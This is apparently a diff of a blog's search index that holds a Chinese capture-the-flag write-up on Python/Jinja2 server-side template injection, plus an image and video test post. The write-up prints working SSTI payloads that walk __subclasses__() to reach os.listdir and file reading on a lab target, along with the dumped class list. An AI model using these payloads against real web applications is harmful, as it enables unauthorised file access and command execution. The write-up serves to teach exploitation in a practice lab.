class="keyword">class</span> <span class="string">&#x27;contextlib.GeneratorContextManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib.closing&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.MissingType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.LRUCache&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.Cycler&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.Joiner&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.Namespace&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;markupsafe._MarkupEscapeHelper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.nodes.EvalContext&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_hashlib.HASH&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.nodes.Node&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_random.Random&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.TemplateReference&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.Environment&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.BlockReference&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.LoopContextBase&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.LoopContextIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.Macro&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.Undefined&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;numbers.Number&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal.Decimal&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal._ContextManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal.Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal._WorkRep&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal._Log10Memoize&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ast.AST&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.Failure&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.TokenStreamIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.TokenStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.Lexer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.parser.Parser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.visitor.NodeVisitor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.idtracking.Symbols&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.compiler.MacroRef&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.compiler.Frame&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.Template&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.TemplateModule&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.TemplateExpression&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.TemplateStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.loaders.BaseLoader&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_io._IOBase&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_io.IncrementalNewlineDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.bccache.Bucket&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.bccache.BytecodeCache&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.LogRecord&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Formatter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.BufferingFormatter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Filter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Filterer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.PlaceHolder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Manager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.LoggerAdapter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.date&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.timedelta&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.time&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.tzinfo&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug._internal._Missing&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug._internal._DictAccessorProperty&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ImmutableListMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ImmutableDictMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.UpdateDictMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ViewItems&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures._omd_bucket&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.Headers&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ImmutableHeadersMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.IfRange&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.Range&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ContentRange&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.FileStorage&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;email.LazyImporter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;calendar.Calendar&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.urls.Href&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.utils.HTMLBuilder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.accept.AcceptMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.auth.AuthorizationMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.auth.WWWAuthenticateMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wsgi.ClosingIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wsgi.FileWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wsgi._RangeWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.middleware.dispatcher.DispatcherMiddleware&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.middleware.http_proxy.ProxyMiddleware&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.middleware.shared_data.SharedDataMiddleware&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.formparser.FormDataParser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.formparser.MultiPartParser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.base_request.BaseRequest&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.base_response.BaseResponse&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.etag.ETagRequestMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.etag.ETagResponseMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.user_agent.UserAgentMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.request.StreamOnlyMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.response.ResponseStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.response.ResponseStreamMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.exceptions.Aborter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;uuid.UUID&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;CArgObject&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes.CThunkObject&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes._CData&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes.CField&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes.DictRemover&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ctypes.CDLL&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ctypes.LibraryLoader&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;select.epoll&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;subprocess.Popen&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous._json._CompactJSON&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.signer.SigningAlgorithm&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.signer.Signer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.serializer.Serializer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.url_safe.URLSafeSerializerMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask._compat._DeprecatedBool&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.Local&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.LocalStack&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.LocalManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.LocalProxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ast.NodeVisitor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;difflib.HtmlDiff&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.RuleFactory&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.RuleTemplate&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.BaseConverter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.Map&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.MapAdapter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click._compat._FixupStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click._compat._AtomicFile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.utils.LazyFile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.utils.KeepOpenFile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.utils.PacifyFlushWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.types.ParamType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.Option&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.Argument&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.ParsingState&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.OptionParser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.formatting.HelpFormatter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.core.Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.core.BaseCommand&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.core.Parameter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.signals.Namespace&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.signals._FakeSignal&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.helpers.locked_cached_property&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.helpers._PackageBoundObject&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.cli.DispatchingApp&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.cli.ScriptInfo&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.config.ConfigAttribute&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.ctx._AppCtxGlobals&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.ctx.AppContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.ctx.RequestContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.json.tag.JSONTag&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.json.tag.TaggedJSONSerializer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.sessions.SessionInterface&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.json._JSONModule&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.json.JSONMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.blueprints.BlueprintSetupState&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.serving.WSGIRequestHandler&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.ext.Extension&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.ext._CommentFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.serving._SSLContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.serving.BaseWSGIServer&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;unicodedata.UCD&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;array.array&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;method-wrapper&#x27;</span>&gt;] <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure>
-
-<p>可以在其中找到 &lt;type ‘file’&gt;类型 (可以进行文件读取)，下标是40(此项前面有40个’,’)</p>
-<p><strong>还可以看到有一个 &lt;class ‘site._Printer’&gt;类型（可以进行命令执行）</strong>，下表是71，构造payload进行命令执行</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>回显</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">URL http://61.147.171.105:50859/[&#x27;index.py&#x27;, &#x27;fl4g&#x27;] not found</span><br></pre></td></tr></table></figure>
-
-<p>接下来构造读取flag payload</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>得到flag：</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ctf</span>&#123;f22b6844-<span class="number">5169</span>-<span class="number">4054</span>-b2a0-d95b9361cb57&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>CTF_Writeup</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Writeup</tag>
-        <tag>攻防世界</tag>
-        <tag>SSTI</tag>
       </tags>
   </entry>
   <entry>
@@ -2827,6 +2748,85 @@ height: 100%; left: 0; top: 0;"> </iframe></div>
       </categories>
       <tags>
         <tag>CTF</tag>
+        <tag>SSTI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>博客内容测试</title>
+    <url>/2023/10/29/%E5%8D%9A%E5%AE%A2%E5%86%85%E5%AE%B9%E6%B5%8B%E8%AF%95/</url>
+    <content><![CDATA[<p><img data-src="https://s2.loli.net/2023/10/29/vjYu7sqMi8dgQbK.jpg" alt="SM.MS"></p>
+<p><img data-src="https://s2.loli.net/2023/10/29/Hns3KL4TP2qQm9f.jpg" alt="SM.MS"></p>
+<p><img data-src="https://s3.uuu.ovh/imgs/2023/11/02/e9d94fc61d21d30a.jpg" alt="ImgUrl"></p>
+<p><img data-src="https://img.gaifagafin.top/202311041048278.jpg" alt="CloudFlare R2"></p>
+<p><img data-src="https://images.gaifagafin.top/202311051019789.jpg" alt="cloudflare R2"></p>
+<p><img data-src="https://images.gaifagafin.top/202311051020956.png" alt="cloudflare R2"></p>
+<p><img data-src="https://img.gaifagafin.top/wallhaven-3z2k6y.jpg" alt="backbazeb2 8.8MB"></p>
+<p><img data-src="https://img.gaifagafin.top/wallhaven-72eq5o.jpg" alt="backbazeb2 7.7MB"></p>
+<p><img data-src="https://img.gaifagafin.top/gaifagafin.jpg" alt="backbazeb2 189KB"></p>
+<p>视频插入测试，代码为：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;position: relative; width: 100%; height: 0; padding-bottom: 75%;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> </span></span><br><span class="line"><span class="tag"><span class="attr">src</span>=<span class="string">&quot;//player.bilibili.com/player.html?aid=534928147&amp;bvid=BV1dM41197wb&amp;cid=1307621987&amp;p=1&quot;</span>  <span class="attr">scrolling</span>=<span class="string">&quot;no&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">frameborder</span>=<span class="string">&quot;no&quot;</span> <span class="attr">framespacing</span>=<span class="string">&quot;0&quot;</span> <span class="attr">allowfullscreen</span>=<span class="string">&quot;true&quot;</span> <span class="attr">style</span>=<span class="string">&quot;position: absolute; width: 100%; </span></span></span><br><span class="line"><span class="string"><span class="tag">height: 100%; left: 0; top: 0;&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe 
+src="//player.bilibili.com/player.html?aid=534928147&bvid=BV1dM41197wb&cid=1307621987&p=1"  scrolling="no" border="0" 
+frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; 
+height: 100%; left: 0; top: 0;"> </iframe></div>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>picture</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>攻防世界-Web_python_template_injection</title>
+    <url>/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-python-template-injection/</url>
+    <content><![CDATA[<p>第一次做模板注入的题目，参考H师傅的writeup <a href="https://blog.csdn.net/Mr_helloword/article/details/107949217">https://blog.csdn.net/Mr_helloword/article/details/107949217</a></p>
+<img data-src="https://images.gaifagafin.top/202311051131161.png" style="zoom:67%;" />
+
+<p>进入靶机网址提示</p>
+<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">python <span class="keyword">template</span> injection</span><br></pre></td></tr></table></figure>
+
+<p>知道这是一道python模板注入</p>
+<p>url输入 </p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>页面回显</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/49 not found</span><br></pre></td></tr></table></figure>
+
+<p>判断存在SSTI注入</p>
+<p>查看网站模块，url输入</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>回显</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">URL http://<span class="number">61.147</span><span class="number">.171</span><span class="number">.105</span>:<span class="number">50859</span>/[&lt;<span class="built_in">type</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;int&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;list&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;super&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;xrange&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;set&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;float&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;buffer&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;long&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;property&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;code&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;function&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;classobj&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dictproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;instance&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;file&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;callable-iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.long_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.float_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.version_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.flags&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;exceptions.BaseException&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;module&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;imp.NullImporter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;zipimport.zipimporter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;posix.stat_result&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;posix.statvfs_result&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Hashable&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Iterable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Sized&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Container&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Callable&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_items&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;site._Printer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span 